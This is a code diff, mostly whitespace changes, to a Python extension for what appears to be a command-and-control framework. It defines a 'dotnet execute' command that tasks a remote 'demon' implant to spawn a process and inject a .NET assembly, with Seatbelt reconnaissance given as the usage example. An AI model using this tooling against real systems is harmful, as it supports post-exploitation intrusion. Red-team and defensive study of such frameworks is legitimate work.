@@ -18,16 +18,11 @@ class Packer:
         self.buffer += pack("<i", dint)
         self.size += 4
 
-    def addstr(self, s):
+    def addstr( self, s ):
         if isinstance(s, str):
             s = s.encode("utf-8")
         fmt = "<L{}s".format(len(s) + 1)
         self.buffer += pack(fmt, len(s)+1, s)
-        self.size += calcsize(fmt)
-
-    def addBytes(self, s, b): 
-        fmt = "<L{}s".format(s)
-        self.buffer += pack(fmt, s, str(b))
         self.size += calcsize(fmt)
 
     def addWstr(self, s):
@@ -36,16 +31,16 @@ class Packer:
         self.buffer += pack(fmt, len(s)+2, s)
         self.size += calcsize(fmt)
 
-def InvokeAssembly( demonID, *param ):
+def InvokeAssembly(demonID, *param):
     TaskID   : str    = None
     demon    : Demon  = None
     Assembly : str    = None
     packer   = Packer()
 
-    demon  = Demon( demonID )
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable" )
+    demon  = Demon(demonID)
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable")
     
-    if len( param ) < 2:
+    if len(param) < 2:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
         return
 
@@ -54,12 +49,13 @@ def InvokeAssembly( demonID, *param ):
 
         packer.addstr( "DefaultAppDomain" )
         packer.addstr( "v4.0.30319" )
-        packer.addstr( str(Assembly.read()) )
+        packer.addstr( str( Assembly.read() ) )
         packer.addstr( " " + ''.join( param[ 2: ] ) )
 
     except OSError:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 1 ] )
         return
+
 
     arg = packer.getbuffer() 
 
@@ -67,4 +63,4 @@ def InvokeAssembly( demonID, *param ):
 
     return TaskID
 
-RegisterCommand( InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user" )
+RegisterCommand(InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user")
